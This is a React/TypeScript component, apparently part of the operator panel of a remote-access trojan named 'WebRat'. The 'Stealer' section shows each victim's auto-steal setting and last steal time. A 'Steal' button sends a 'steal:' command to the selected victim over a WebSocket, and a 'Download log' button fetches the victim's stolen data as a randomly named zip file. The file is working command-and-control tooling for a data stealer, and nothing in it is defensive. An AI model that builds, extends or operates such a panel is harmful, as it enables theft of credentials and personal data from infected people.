"use client";

import { useEffect, useRef, useState } from "react";

import { csrfHeaders } from "../../../builder/utils/csrf";
import { showToast } from "../../../toast";
import { usePanelWS } from "../../../ws/ws-provider";
import { usePanelDetailView } from "../panel-detail-view-provider";

const CARD =
   "w-[420px] max-w-[calc(100vw-420px)] ml-[4px] rounded-[18px] border border-white/[0.14] " +
   "bg-[rgba(30,30,30,0.92)] p-[16px_18px] shadow-[0_18px_44px_rgba(0,0,0,0.82),0_0_0_3px_rgba(255,255,255,0.04)] backdrop-blur-[10px]";

const BTN =
   "min-w-[120px] cursor-pointer rounded-[12px] border border-white/[0.18] bg-[rgba(30,30,30,0.85)] " +
   "px-[22px] pb-[4px] pt-[6px] text-[14px] font-[800] uppercase tracking-[0.05em] text-[#f5f5f5] " +
   "shadow-[0_10px_24px_rgba(0,0,0,0.7)] " +
   "transition-[background,border-color,border-bottom-color,color,transform,box-shadow] duration-[120ms] " +
   "hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:text-white hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)]";

export function StealerSection() {
   const ws = usePanelWS();
   const detail = usePanelDetailView();

   const [autoSteal, setAutoSteal] = useState<string>("-");
   const [stealTime, setStealTime] = useState<string>("-");
   const [downloading, setDownloading] = useState(false);
   const [stealing, setStealing] = useState(false);

   const victimId = detail.selectedVictimId;

   useEffect(() => {
      if (!victimId) {
         setAutoSteal("-");
         setStealTime("-");
         return;
      }

      let cancelled = false;
      (async () => {
         try {
            const res = await fetch(`/api/steal-info?victim_id=${encodeURIComponent(victimId)}`, {
               credentials: "same-origin",
               headers: csrfHeaders(),
            });
            if (!res.ok || cancelled) return;
            const data = (await res.json()) as { auto_steal?: string; steal_time?: string };
            if (cancelled) return;
            setAutoSteal(data.auto_steal || "disabled");
            setStealTime(data.steal_time || "-");
         } catch {
            if (!cancelled) {
               setAutoSteal("-");
               setStealTime("-");
            }
         }
      })();
      return () => { cancelled = true; };
   }, [victimId]);

   useEffect(() => {
      const w = window as unknown as Window & {
         WebRatOnStealResult?: (data: { steal_time?: string }) => void;
      };

      w.WebRatOnStealResult = (data) => {
         if (data.steal_time) setStealTime(data.steal_time);
      };

      return () => {
         delete w.WebRatOnStealResult;
      };
   }, []);

   const onDownloadLog = async () => {
      if (!victimId) {
         showToast("error", "Select victim first");
         return;
      }
      setDownloading(true);
      try {
         const cleanVictimId = String(victimId).trim();
         console.log("[stealer] onDownloadLog victimId:", { victimId, cleanVictimId, length: cleanVictimId.length });
         const res = await fetch(`/api/steal-download?victim_id=${encodeURIComponent(cleanVictimId)}`, {
            credentials: "same-origin",
            headers: csrfHeaders(),
         });
         if (!res.ok) {
            console.error("[stealer] download failed:", res.status, res.statusText);
            showToast("error", "Download failed");
            return;
         }

         const blob = await res.blob();

         const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
         let name = "";
         for (let i = 0; i < 26; i++) name += chars[Math.floor(Math.random() * chars.length)];
         name += ".zip";

         const url = URL.createObjectURL(blob);
         const a = document.createElement("a");
         a.href = url;
         a.download = name;
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
         showToast("success", "Download started");
      } catch {
         showToast("error", "Download error");
      } finally {
         setDownloading(false);
      }
   };

   const onSteal = () => {
      if (!victimId) {
         showToast("error", "Select victim first");
         return;
      }
      if (ws.state !== "open") {
         showToast("error", "WebSocket is not connected");
         return;
      }
      setStealing(true);
      const ok = ws.sendJson({
         type: "command",
         victim_id: String(victimId),
         command: "steal:",
      });
      if (!ok) {
         showToast("error", "Failed to send steal command");
         setStealing(false);
         return;
      }
      showToast("success", "Steal command sent");
      setTimeout(() => setStealing(false), 3000);
   };

   const autoLabel = (() => {
      const v = String(autoSteal).toLowerCase();
      if (v === "once") return "enabled (once)";
      if (v === "every" || v === "every_connect") return "enabled (every connect)";
      if (v === "-") return "-";
      return "disabled";
   })();

   return (
      <div className="detail-section pb-[40px]" data-section="stealer">
         <div className={CARD} style={{ marginTop: "8px" }}>
            <div className="p-[6px_2px_2px]">
               <div className="mb-[10px] text-[15px] font-semibold text-[rgba(235,235,235,0.94)]">
                  AutoSteal:{" "}
                  <span className="font-bold text-white">{autoLabel}</span>
               </div>
               <div className="mb-[10px] text-[15px] font-semibold text-[rgba(235,235,235,0.94)]">
                  Steal time:{" "}
                  <span className="font-bold text-white">{stealTime}</span>
               </div>
               <div className="mb-[6px] h-[2px] bg-[var(--line)]" />
               <div className="flex justify-start gap-[12px] pt-[6px]">
                  <button
                     className={BTN}
                     style={{ borderBottom: "4px solid var(--line)" }}
                     onClick={onDownloadLog}
                     disabled={downloading}
                     type="button"
                  >
                     {downloading ? "..." : "Download log"}
                  </button>
                  <button
                     className={BTN}
                     style={{ borderBottom: "4px solid var(--line)" }}
                     onClick={onSteal}
                     disabled={stealing}
                     type="button"
                  >
                     {stealing ? "..." : "Steal"}
                  </button>
               </div>
            </div>
         </div>
      </div>
   );
}
